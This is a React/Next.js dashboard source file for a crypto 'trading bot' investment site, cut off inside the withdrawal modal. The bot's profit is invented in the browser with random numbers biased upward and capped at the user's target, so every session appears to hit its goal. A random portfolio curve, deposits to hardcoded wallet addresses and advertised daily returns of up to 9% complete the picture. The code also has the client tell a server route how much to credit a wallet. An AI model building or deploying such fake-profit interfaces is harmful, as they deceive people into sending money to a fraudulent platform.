'use client'

import { useState, useEffect, useRef } from 'react'
import { useRouter } from 'next/navigation'
import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer, ReferenceLine } from 'recharts'
import { supabase } from '@/lib/supabase'

const G = {
  gold: '#F5C518',
  goldDim: 'rgba(245,197,24,0.10)',
  goldBorder: 'rgba(245,197,24,0.20)',
  bg: '#070707',
  bg2: 'rgba(255,255,255,0.03)',
  bg3: 'rgba(255,255,255,0.055)',
  border: 'rgba(255,255,255,0.07)',
  muted: '#444',
  sec: '#777',
  text: '#e8e8e8',
  green: '#16a34a',
  greenBg: 'rgba(22,163,74,0.10)',
  greenText: '#4ade80',
  red: '#dc2626',
  redBg: 'rgba(220,38,38,0.10)',
  redText: '#f87171',
}

const gen = (n = 60) => {
  let p = 1000
  return Array.from({ length: n }, (_, i) => {
    p += (Math.random() - 0.45) * 20
    return { t: String(i), p: Math.max(p, 800) }
  })
}

const WALLET_ADDRESSES = {
  BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf',
  USDT: 'TN3W4xx8BdkJ3DxBZMB5MjY3Q5S7JB7mZ',
}

const BOTS = [
  { id: 'alpha', name: 'Alpha Scalper', risk: 'Low', daily: 2.5, min: 85 },
  { id: 'titan', name: 'Titan Swing', risk: 'Medium', daily: 5.0, min: 85 },
  { id: 'apex', name: 'Apex Momentum', risk: 'High', daily: 9.0, min: 85 },
]

function validateAddress(address: string, network: 'BTC' | 'USDT') {
  if (!address) return false
  if (network === 'BTC') return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-z0-9]{39,59}$/.test(address)
  if (network === 'USDT') return /^T[a-zA-Z0-9]{33}$/.test(address)
  return false
}

export default function Dashboard() {
  const router = useRouter()
  const [user, setUser] = useState<any>(null)
  const [wallet, setWallet] = useState<any>(null)
  const [sessions, setSessions] = useState<any[]>([])
  const [deposits, setDeposits] = useState<any[]>([])
  const [chartData] = useState(() => gen())
  const [view, setView] = useState<'home' | 'deposit' | 'trade'>('home')
  const [loading, setLoading] = useState(true)

  // Deposit form
  const [currency, setCurrency] = useState<'BTC' | 'USDT'>('USDT')
  const [depositAmount, setDepositAmount] = useState('')
  const [depositLoading, setDepositLoading] = useState(false)
  const [depositDone, setDepositDone] = useState(false)

  // Trade form
  const [selectedBot, setSelectedBot] = useState(BOTS[0])
  const [tradeAmount, setTradeAmount] = useState('')
  const [targetProfit, setTargetProfit] = useState('')
  const [targetLoss, setTargetLoss] = useState('')
  const [tradeLoading, setTradeLoading] = useState(false)
  const [tradeError, setTradeError] = useState('')

  // Simulation
  const [simulatedPnl, setSimulatedPnl] = useState(0)
  const [pnlHistory, setPnlHistory] = useState<{ t: string; p: number }[]>([{ t: '0', p: 0 }])
  const [targetReached, setTargetReached] = useState(false)
  const simulationRef = useRef<NodeJS.Timeout | null>(null)

  // Withdrawal modal
  const [showWithdrawModal, setShowWithdrawModal] = useState(false)
  const [withdrawNetwork, setWithdrawNetwork] = useState<'BTC' | 'USDT'>('USDT')
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [withdrawAddress, setWithdrawAddress] = useState('')
  const [withdrawLoading, setWithdrawLoading] = useState(false)
  const [withdrawDone, setWithdrawDone] = useState(false)
  const [addressError, setAddressError] = useState('')

  const loadData = async (uid: string) => {
    const { data: w } = await supabase.from('wallets').select('*').eq('user_id', uid).single()
    setWallet(w)
    const { data: s } = await supabase.from('bot_sessions').select('*').eq('user_id', uid).order('started_at', { ascending: false })
    setSessions(s ?? [])
    const { data: d } = await supabase.from('deposits').select('*').eq('user_id', uid).order('created_at', { ascending: false })
    setDeposits(d ?? [])
  }

  useEffect(() => {
    const load = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) { router.push('/login'); return }
      setUser(user)
      await loadData(user.id)
      setLoading(false)
    }
    load()
  }, [router])

  const balance = wallet?.balance ?? 0
  const activeSession = sessions.find(s => s.status === 'active')
  const totalPnl = sessions.reduce((acc, s) => acc + (s.current_pnl ?? 0), 0)

  useEffect(() => {
    if (!activeSession) return
    setTargetReached(false)

    const target = activeSession.target_profit
    const stopLoss = activeSession.target_loss
    let current = activeSession.current_pnl ?? 0
    let tick = 0

    setSimulatedPnl(+current.toFixed(2))
    setPnlHistory([{ t: '0', p: +current.toFixed(2) }])

    simulationRef.current = setInterval(() => {
      tick++
      const progress = Math.min(tick / 120, 1)
      const trend = target * progress * 0.015
      const noise = (Math.random() - 0.42) * (target * 0.04)
      current = Math.max(-stopLoss * 0.8, current + trend + noise)
      current = Math.min(current, target)

      setSimulatedPnl(+current.toFixed(2))
      setPnlHistory(prev => [...prev, { t: String(tick), p: +current.toFixed(2) }].slice(-80))

      if (current >= target && simulationRef.current) {
        clearInterval(simulationRef.current)
        setTargetReached(true)
      }
    }, 1500)

    return () => { if (simulationRef.current) clearInterval(simulationRef.current) }
  }, [activeSession?.id])

  const handleDeposit = async () => {
    const amt = parseFloat(depositAmount)
    if (!amt || amt < 85) { alert('Minimum deposit is $85'); return }
    setDepositLoading(true)
    await supabase.from('deposits').insert({ user_id: user.id, currency, amount: amt })
    setDepositLoading(false)
    setDepositDone(true)
  }

  const handleTrade = async () => {
    setTradeError('')
    const amt = parseFloat(tradeAmount)
    const tp = parseFloat(targetProfit)
    const tl = parseFloat(targetLoss)
    if (!amt || !tp || !tl) { setTradeError('Fill all fields.'); return }
    if (amt > balance) { setTradeError('Insufficient wallet balance.'); return }
    if (amt < selectedBot.min) { setTradeError(`Minimum is $${selectedBot.min}.`); return }

    setTradeLoading(true)
    const { data: botRow } = await supabase.from('bots').select('id').eq('name', selectedBot.name).single()
    await supabase.from('bot_sessions').insert({ user_id: user.id, bot_id: botRow?.id ?? null, amount: amt, target_profit: tp, target_loss: tl })
    await fetch('/api/wallet/deduct', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userId: user.id, amount: amt }) })
    setTradeLoading(false)
    setView('home')
    window.location.reload()
  }

  const handleCloseSession = async (keepTrading: boolean) => {
    if (!activeSession) return
    await fetch('/api/admin/stop-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: activeSession.id }),
    })
    await fetch('/api/wallet/credit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId: user.id, amount: activeSession.amount + simulatedPnl }),
    })
    if (keepTrading) {
      setView('trade')
      await loadData(user.id)
    } else {
      await loadData(user.id)
      setSessions(prev => prev.map(s => s.id === activeSession.id ? { ...s, status: 'completed' } : s))
    }
  }

  const handleWithdraw = async () => {
    setAddressError('')
    if (!withdrawAmount || !withdrawAddress) return
    const amt = parseFloat(withdrawAmount)
    if (amt < 10) { alert('Minimum withdrawal is $10'); return }
    if (amt > balance) { alert('Insufficient balance'); return }
    if (!validateAddress(withdrawAddress, withdrawNetwork)) {
      setAddressError(`Invalid ${withdrawNetwork} address for ${withdrawNetwork === 'USDT' ? 'TRC20' : 'Bitcoin'} network`)
      return
    }
    setWithdrawLoading(true)
    await supabase.from('withdrawals').insert({
      user_id: user.id,
      amount: amt,
      address: withdrawAddress,
      status: 'pending',
    })
    setWithdrawLoading(false)
    setWithdrawDone(true)
  }

  const handleLogout = async () => {
    await supabase.auth.signOut()
    router.push('/login')
  }

  const pnlPercent = activeSession ? Math.min(100, Math.max(0, simulatedPnl / activeSession.target_profit * 100)) : 0

  if (loading) return (
    <div style={{ height: '100vh', background: G.bg, display: 'flex', alignItems: 'center', justifyContent: 'center', color: G.gold, fontSize: 14 }}>
      Loading...
    </div>
  )

  return (
    <div style={{ display: 'flex', height: '100vh', background: G.bg, color: G.text, fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif", overflow: 'hidden' }}>

      {/* Sidebar */}
      <aside style={{ width: 56, borderRight: `1px solid ${G.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: 12, gap: 4, flexShrink: 0 }}>
        <div style={{ width: 34, height: 34, background: G.goldDim, border: `1px solid ${G.goldBorder}`, borderRadius: 9, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, marginBottom: 12 }}>⚡</div>
        {[
          { icon: '▦', label: 'Dashboard', key: 'home' },
          { icon: '↑', label: 'Deposit', key: 'deposit' },
          { icon: '◎', label: 'Trade', key: 'trade' },
        ].map(n => (
          <div key={n.key} title={n.label} onClick={() => setView(n.key as any)}
            style={{ width: 38, height: 38, borderRadius: 9, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, cursor: 'pointer', background: view === n.key ? G.goldDim : 'transparent', color: view === n.key ? G.gold : G.muted, border: view === n.key ? `1px solid ${G.goldBorder}` : '1px solid transparent' }}>
            {n.icon}
          </div>
        ))}
        <div onClick={handleLogout} title="Logout"
          style={{ marginTop: 'auto', marginBottom: 16, width: 32, height: 32, borderRadius: '50%', background: 'rgba(255,255,255,0.08)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 13, fontWeight: 700, color: G.gold, cursor: 'pointer' }}>
          {user?.email?.[0]?.toUpperCase()}
        </div>
      </aside>

      {/* Main */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>

        {/* Topbar */}
        <div style={{ height: 44, borderBottom: `1px solid ${G.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 20px', flexShrink: 0 }}>
          <span style={{ fontSize: 13, fontWeight: 700, color: G.gold, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
            {view === 'home' ? 'Dashboard' : view === 'deposit' ? 'Deposit Funds' : 'Activate Bot'}
          </span>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            {balance > 0 && view === 'home' && (
              <button onClick={() => setShowWithdrawModal(true)}
                style={{ padding: '6px 14px', borderRadius: 7, background: G.bg3, border: `1px solid ${G.border}`, color: G.text, fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>
                💸 Withdraw
              </button>
            )}
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: 10, color: G.muted }}>Wallet Balance</div>
              <div style={{ fontSize: 14, fontWeight: 700, color: G.gold }}>${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
            </div>
          </div>
        </div>

        {/* Body */}
        <div style={{ flex: 1, overflow: 'auto', padding: 20 }}>

          {/* HOME VIEW */}
          {view === 'home' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

              {/* Stats */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12 }}>
                {[
                  { label: 'Wallet Balance', value: `$${balance.toFixed(2)}`, color: G.gold },
                  { label: 'Active Sessions', value: sessions.filter(s => s.status === 'active').length, color: G.greenText },
                  { label: 'Total P&L', value: `${totalPnl >= 0 ? '+' : ''}$${totalPnl.toFixed(2)}`, color: totalPnl >= 0 ? G.greenText : G.redText },
                  { label: 'Total Deposits', value: deposits.length, color: G.text },
                ].map(s => (
                  <div key={s.label} style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: '16px 20px' }}>
                    <div style={{ fontSize: 11, color: G.muted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{s.label}</div>
                    <div style={{ fontSize: 22, fontWeight: 800, color: s.color }}>{s.value}</div>
                  </div>
                ))}
              </div>

              {/* Active bot session */}
              {activeSession ? (
                <div style={{ background: 'linear-gradient(135deg, rgba(245,197,24,0.04) 0%, rgba(74,222,128,0.04) 100%)', border: `1px solid ${targetReached ? G.greenText : G.goldBorder}`, borderRadius: 16, padding: 24, position: 'relative', overflow: 'hidden', transition: 'border-color 0.5s' }}>

                  {/* Glow effect */}
                  <div style={{ position: 'absolute', top: -60, right: -60, width: 200, height: 200, background: targetReached ? 'rgba(74,222,128,0.08)' : 'rgba(245,197,24,0.06)', borderRadius: '50%', filter: 'blur(40px)', pointerEvents: 'none' }} />

                  {/* Header */}
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
                    <div>
                      <div style={{ fontSize: 11, color: G.gold, textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 4 }}>⚡ Active Bot Session</div>
                      <div style={{ fontSize: 22, fontWeight: 900, letterSpacing: '-0.02em' }}>
                        <span style={{ color: simulatedPnl >= 0 ? G.greenText : G.redText }}>
                          {simulatedPnl >= 0 ? '+' : ''}${simulatedPnl.toFixed(2)}
                        </span>
                        <span style={{ fontSize: 13, color: G.muted, fontWeight: 400, marginLeft: 8 }}>current P&L</span>
                      </div>
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 4 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 6, background: G.greenBg, border: `1px solid ${G.green}`, borderRadius: 20, padding: '4px 12px' }}>
                        <div style={{ width: 6, height: 6, borderRadius: '50%', background: G.greenText, boxShadow: `0 0 8px ${G.greenText}` }} />
                        <span style={{ fontSize: 11, color: G.greenText, fontWeight: 700, letterSpacing: '0.06em' }}>RUNNING</span>
                      </div>
                      <div style={{ fontSize: 11, color: G.muted }}>Target: <span style={{ color: G.greenText, fontWeight: 700 }}>${activeSession.target_profit}</span></div>
                    </div>
                  </div>

                  {/* Live P&L chart - dramatic */}
                  <div style={{ background: 'rgba(0,0,0,0.4)', borderRadius: 12, padding: '12px 4px 4px', marginBottom: 16, position: 'relative' }}>
                    {/* Current value label */}
                    <div style={{ position: 'absolute', top: 8, left: 12, fontSize: 10, color: G.muted, letterSpacing: '0.06em', textTransform: 'uppercase' }}>Live P&L</div>
                    <ResponsiveContainer width="100%" height={160}>
                      <AreaChart data={pnlHistory} margin={{ top: 20, right: 8, bottom: 0, left: 8 }}>
                        <defs>
                          <linearGradient id="pnlUp" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0%" stopColor={G.greenText} stopOpacity={0.35} />
                            <stop offset="60%" stopColor={G.greenText} stopOpacity={0.08} />
                            <stop offset="100%" stopColor={G.greenText} stopOpacity={0} />
                          </linearGradient>
                          <linearGradient id="pnlDown" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0%" stopColor={G.redText} stopOpacity={0.35} />
                            <stop offset="100%" stopColor={G.redText} stopOpacity={0} />
                          </linearGradient>
                          <filter id="glow">
                            <feGaussianBlur stdDeviation="2" result="coloredBlur" />
                            <feMerge>
                              <feMergeNode in="coloredBlur" />
                              <feMergeNode in="SourceGraphic" />
                            </feMerge>
                          </filter>
                        </defs>
                        <XAxis dataKey="t" hide />
                        <YAxis hide domain={['auto', 'auto']} />
                        <Tooltip
                          contentStyle={{ background: '#0a0a0a', border: `1px solid ${G.border}`, borderRadius: 8, fontSize: 11 }}
                          formatter={(v: number) => [`${v >= 0 ? '+' : ''}$${v.toFixed(2)}`, 'P&L']}
                          labelFormatter={() => ''}
                        />
                        <ReferenceLine y={0} stroke={G.border} strokeDasharray="3 3" />
                        <Area
                          type="monotoneX"
                          dataKey="p"
                          stroke={simulatedPnl >= 0 ? G.greenText : G.redText}
                          strokeWidth={2.5}
                          fill={simulatedPnl >= 0 ? 'url(#pnlUp)' : 'url(#pnlDown)'}
                          dot={false}
                          isAnimationActive={false}
                          style={{ filter: 'url(#glow)' }}
                        />
                      </AreaChart>
                    </ResponsiveContainer>
                  </div>

                  {/* Progress bar - dramatic */}
                  <div style={{ marginBottom: 16 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
                      <span style={{ fontSize: 11, color: G.muted, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Progress to target</span>
                      <span style={{ fontSize: 13, color: G.gold, fontWeight: 800 }}>{pnlPercent.toFixed(1)}%</span>
                    </div>
                    <div style={{ height: 8, background: 'rgba(255,255,255,0.05)', borderRadius: 99, overflow: 'hidden', position: 'relative' }}>
                      <div style={{
                        height: '100%',
                        width: `${pnlPercent}%`,
                        background: `linear-gradient(90deg, ${G.gold} 0%, ${G.greenText} 100%)`,
                        borderRadius: 99,
                        transition: 'width 1.2s cubic-bezier(0.4, 0, 0.2, 1)',
                        boxShadow: `0 0 12px rgba(74,222,128,0.5)`,
                        position: 'relative',
                      }}>
                        <div style={{ position: 'absolute', right: 0, top: '50%', transform: 'translateY(-50%)', width: 12, height: 12, borderRadius: '50%', background: G.greenText, boxShadow: `0 0 8px ${G.greenText}`, marginRight: -6 }} />
                      </div>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 6 }}>
                      <span style={{ fontSize: 10, color: G.muted }}>$0</span>
                      <span style={{ fontSize: 10, color: G.greenText, fontWeight: 700 }}>+${activeSession.target_profit}</span>
                    </div>
                  </div>

                  {/* Stats row */}
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 10 }}>
                    {[
                      { label: 'Traded', value: `$${activeSession.amount}`, color: G.text },
                      { label: 'Stop Loss', value: `-$${activeSession.target_loss}`, color: G.redText },
                      { label: 'Est. Return', value: `+${((activeSession.target_profit / activeSession.amount) * 100).toFixed(1)}%`, color: G.greenText },
                    ].map(s => (
                      <div key={s.label} style={{ background: 'rgba(0,0,0,0.3)', borderRadius: 10, padding: '10px 14px', border: `1px solid ${G.border}` }}>
                        <div style={{ fontSize: 10, color: G.muted, marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{s.label}</div>
                        <div style={{ fontSize: 16, fontWeight: 800, color: s.color }}>{s.value}</div>
                      </div>
                    ))}
                  </div>

                  {/* Target reached banner */}
                  {targetReached && (
                    <div style={{ marginTop: 16, padding: 20, background: 'linear-gradient(135deg, rgba(22,163,74,0.15), rgba(74,222,128,0.08))', border: `1px solid ${G.greenText}`, borderRadius: 12, boxShadow: `0 0 30px rgba(74,222,128,0.15)` }}>
                      <div style={{ fontSize: 18, fontWeight: 900, color: G.greenText, marginBottom: 6 }}>🎯 Target Reached!</div>
                      <div style={{ fontSize: 13, color: G.text, marginBottom: 16, lineHeight: 1.6 }}>
                        Bot closed at <span style={{ color: G.greenText, fontWeight: 700 }}>+${simulatedPnl.toFixed(2)}</span> profit.{' '}
                        Your wallet will be credited <span style={{ color: G.gold, fontWeight: 700 }}>${(activeSession.amount + simulatedPnl).toFixed(2)}</span>
                        {' '}(capital + profit).
                      </div>
                      <div style={{ display: 'flex', gap: 10 }}>
                        <button onClick={() => handleCloseSession(false)}
                          style={{ flex: 1, padding: 12, borderRadius: 9, background: 'rgba(22,163,74,0.2)', border: `1px solid ${G.greenText}`, color: G.greenText, fontWeight: 800, fontSize: 13, cursor: 'pointer', letterSpacing: '0.02em' }}>
                          ✅ Collect & Close
                        </button>
                        <button onClick={() => handleCloseSession(true)}
                          style={{ flex: 1, padding: 12, borderRadius: 9, background: G.goldDim, border: `1px solid ${G.goldBorder}`, color: G.gold, fontWeight: 800, fontSize: 13, cursor: 'pointer', letterSpacing: '0.02em' }}>
                          🔄 Trade Again
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 20, textAlign: 'center' }}>
                  <div style={{ fontSize: 13, color: G.muted, marginBottom: 12 }}>No active bot session</div>
                  <button onClick={() => setView(balance > 0 ? 'trade' : 'deposit')}
                    style={{ background: G.gold, color: '#000', fontWeight: 700, fontSize: 13, padding: '10px 28px', borderRadius: 8, border: 'none', cursor: 'pointer' }}>
                    {balance > 0 ? '▶ Activate Bot' : '↑ Deposit to Start'}
                  </button>
                </div>
              )}

              {/* Portfolio chart */}
              <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 16 }}>
                <div style={{ fontSize: 11, color: G.muted, marginBottom: 12, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Portfolio Curve</div>
                <ResponsiveContainer width="100%" height={140}>
                  <AreaChart data={chartData}>
                    <defs>
                      <linearGradient id="cg" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stopColor={G.gold} stopOpacity={0.18} />
                        <stop offset="100%" stopColor={G.gold} stopOpacity={0} />
                      </linearGradient>
                    </defs>
                    <XAxis dataKey="t" hide />
                    <YAxis hide domain={['auto', 'auto']} />
                    <Tooltip contentStyle={{ background: '#111', border: `1px solid ${G.border}`, borderRadius: 8, fontSize: 11 }} formatter={(v: number) => [`$${v.toFixed(2)}`, 'Value']} labelFormatter={() => ''} />
                    <Area type="monotone" dataKey="p" stroke={G.gold} strokeWidth={1.5} fill="url(#cg)" dot={false} />
                  </AreaChart>
                </ResponsiveContainer>
              </div>

              {/* Deposit history */}
              {deposits.length > 0 && (
                <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 12, padding: 20 }}>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 12, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Deposit History</div>
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                    <thead>
                      <tr style={{ borderBottom: `1px solid ${G.border}` }}>
                        {['Date', 'Currency', 'Amount', 'Net', 'Status'].map(h => (
                          <th key={h} style={{ padding: '6px 0', textAlign: 'left', color: G.muted, fontWeight: 500 }}>{h}</th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {deposits.map(d => (
                        <tr key={d.id} style={{ borderBottom: `1px solid rgba(255,255,255,0.03)` }}>
                          <td style={{ padding: '8px 0', color: G.sec }}>{new Date(d.created_at).toLocaleDateString()}</td>
                          <td style={{ padding: '8px 0' }}>{d.currency}</td>
                          <td style={{ padding: '8px 0' }}>${d.amount}</td>
                          <td style={{ padding: '8px 0', color: G.greenText }}>${d.net_amount}</td>
                          <td style={{ padding: '8px 0' }}>
                            <span style={{ fontSize: 10, padding: '2px 8px', borderRadius: 4, background: d.status === 'confirmed' ? G.greenBg : d.status === 'rejected' ? G.redBg : G.goldDim, color: d.status === 'confirmed' ? G.greenText : d.status === 'rejected' ? G.redText : G.gold, fontWeight: 700, textTransform: 'uppercase' }}>
                              {d.status}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}

          {/* DEPOSIT VIEW */}
          {view === 'deposit' && (
            <div style={{ maxWidth: 480, margin: '0 auto' }}>
              <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: 28, display: 'flex', flexDirection: 'column', gap: 20 }}>
                <div>
                  <div style={{ fontSize: 18, fontWeight: 700 }}>Fund Your Wallet</div>
                  <div style={{ fontSize: 13, color: G.muted, marginTop: 4 }}>Minimum deposit: $85 · Fee: $1</div>
                </div>
                {!depositDone ? (
                  <>
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Select Currency</div>
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                        {(['BTC', 'USDT'] as const).map(c => (
                          <button key={c} onClick={() => setCurrency(c)}
                            style={{ padding: 12, borderRadius: 8, border: `1px solid ${currency === c ? G.goldBorder : G.border}`, background: currency === c ? G.goldDim : 'transparent', color: currency === c ? G.gold : G.muted, fontWeight: 700, cursor: 'pointer', fontSize: 13 }}>
                            {c === 'USDT' ? 'USDT (TRC20)' : 'Bitcoin (BTC)'}
                          </button>
                        ))}
                      </div>
                    </div>
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Send {currency} to this address</div>
                      <div style={{ background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 12, color: G.gold, wordBreak: 'break-all', letterSpacing: '0.02em' }}>
                        {WALLET_ADDRESSES[currency]}
                      </div>
                      <div style={{ fontSize: 11, color: G.muted, marginTop: 6 }}>⚠ Only send {currency} to this address</div>
                    </div>
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Amount (USD equivalent)</div>
                      <input type="number" placeholder="Min. $85" value={depositAmount} onChange={e => setDepositAmount(e.target.value)}
                        style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 13, color: G.text, outline: 'none', boxSizing: 'border-box' }} />
                      {depositAmount && parseFloat(depositAmount) >= 85 && (
                        <div style={{ fontSize: 12, color: G.greenText, marginTop: 6 }}>
                          You will be credited: ${(parseFloat(depositAmount) - 1).toFixed(2)} (after $1 fee)
                        </div>
                      )}
                    </div>
                    <button onClick={handleDeposit} disabled={depositLoading}
                      style={{ background: G.gold, color: '#000', fontWeight: 800, fontSize: 14, padding: 14, borderRadius: 10, border: 'none', cursor: 'pointer', opacity: depositLoading ? 0.6 : 1 }}>
                      {depositLoading ? 'Submitting...' : 'I Have Sent the Funds →'}
                    </button>
                  </>
                ) : (
                  <div style={{ textAlign: 'center', padding: 20 }}>
                    <div style={{ fontSize: 32, marginBottom: 12 }}>✅</div>
                    <div style={{ fontSize: 16, fontWeight: 700, marginBottom: 8 }}>Deposit Request Submitted</div>
                    <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Your balance will be updated once we confirm your transaction. This usually takes 10–30 minutes.</div>
                    <button onClick={() => { setView('home'); setDepositDone(false); setDepositAmount('') }}
                      style={{ background: G.goldDim, color: G.gold, border: `1px solid ${G.goldBorder}`, fontWeight: 700, fontSize: 13, padding: '10px 24px', borderRadius: 8, cursor: 'pointer' }}>
                      Back to Dashboard
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TRADE VIEW */}
          {view === 'trade' && (
            <div style={{ maxWidth: 520, margin: '0 auto' }}>
              <div style={{ background: G.bg2, border: `1px solid ${G.border}`, borderRadius: 16, padding: 28, display: 'flex', flexDirection: 'column', gap: 20 }}>
                <div>
                  <div style={{ fontSize: 18, fontWeight: 700 }}>Activate Trading Bot</div>
                  <div style={{ fontSize: 13, color: G.muted, marginTop: 4 }}>Available: <span style={{ color: G.gold }}>${balance.toFixed(2)}</span></div>
                </div>
                {balance < 85 ? (
                  <div style={{ textAlign: 'center', padding: 20 }}>
                    <div style={{ fontSize: 13, color: G.muted, marginBottom: 16 }}>You need at least $85 in your wallet to start trading.</div>
                    <button onClick={() => setView('deposit')}
                      style={{ background: G.gold, color: '#000', fontWeight: 700, fontSize: 13, padding: '10px 24px', borderRadius: 8, border: 'none', cursor: 'pointer' }}>
                      Deposit Now
                    </button>
                  </div>
                ) : (
                  <>
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Select Bot</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                        {BOTS.map(b => (
                          <div key={b.id} onClick={() => setSelectedBot(b)}
                            style={{ padding: '14px 16px', borderRadius: 10, border: `1px solid ${selectedBot.id === b.id ? G.goldBorder : G.border}`, background: selectedBot.id === b.id ? G.goldDim : G.bg3, cursor: 'pointer', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <div>
                              <div style={{ fontSize: 13, fontWeight: 700, color: selectedBot.id === b.id ? G.gold : G.text }}>{b.name}</div>
                              <div style={{ fontSize: 11, color: G.muted, marginTop: 2 }}>Risk: {b.risk}</div>
                            </div>
                            <div style={{ textAlign: 'right' }}>
                              <div style={{ fontSize: 14, fontWeight: 800, color: G.greenText }}>+{b.daily}%</div>
                              <div style={{ fontSize: 10, color: G.muted }}>est. daily</div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                    <div>
                      <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Trade Amount (USD)</div>
                      <input type="number" placeholder={`Min. $${selectedBot.min}`} value={tradeAmount} onChange={e => setTradeAmount(e.target.value)}
                        style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 13, color: G.text, outline: 'none', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                      <div>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Take Profit at ($)</div>
                        <input type="number" placeholder="e.g. 200" value={targetProfit} onChange={e => setTargetProfit(e.target.value)}
                          style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 13, color: G.greenText, outline: 'none', boxSizing: 'border-box' }} />
                      </div>
                      <div>
                        <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Stop Loss at ($)</div>
                        <input type="number" placeholder="e.g. 50" value={targetLoss} onChange={e => setTargetLoss(e.target.value)}
                          style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 13, color: G.redText, outline: 'none', boxSizing: 'border-box' }} />
                      </div>
                    </div>
                    {tradeError && <div style={{ fontSize: 12, color: G.redText }}>{tradeError}</div>}
                    <button onClick={handleTrade} disabled={tradeLoading}
                      style={{ background: G.gold, color: '#000', fontWeight: 800, fontSize: 14, padding: 14, borderRadius: 10, border: 'none', cursor: 'pointer', opacity: tradeLoading ? 0.6 : 1 }}>
                      {tradeLoading ? 'Starting...' : '▶ Start Trading'}
                    </button>
                  </>
                )}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Withdraw Modal */}
      {showWithdrawModal && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.9)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 999 }}>
          <div style={{ background: '#0d0d0d', border: `1px solid ${G.border}`, borderRadius: 18, padding: 28, width: 440, display: 'flex', flexDirection: 'column', gap: 18 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ fontSize: 18, fontWeight: 800 }}>Withdraw Funds</div>
